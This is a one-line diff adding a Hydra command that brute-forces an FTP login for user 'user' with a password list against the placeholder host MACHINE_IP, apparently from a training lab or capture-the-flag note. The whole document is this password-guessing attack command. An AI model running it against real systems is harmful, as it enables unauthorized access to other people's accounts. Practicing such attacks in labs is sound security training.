@@ -1,0 +1,1 @@
+hydra -l user -P passlist.txt ftp://MACHINE_IP
